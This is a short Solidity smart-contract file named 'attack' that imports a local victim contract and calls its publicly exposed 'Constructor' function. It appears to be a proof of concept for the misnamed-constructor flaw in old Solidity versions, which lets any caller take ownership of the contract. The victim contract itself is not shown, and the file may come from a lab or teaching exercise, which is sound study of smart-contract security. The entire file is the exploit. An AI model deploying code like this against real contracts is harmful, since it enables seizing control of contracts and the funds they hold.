pragma solidity 0.4.24;
import "./victim.sol";
contract attack{
    address public owner;
    victimContract victimContractAddr;
    constructor(address _victimAddress){
        victimContractAddr = victimContract(_victimAddress);
    }
    function attackContract() public{
        victimContractAddr.Constructor();
    }
}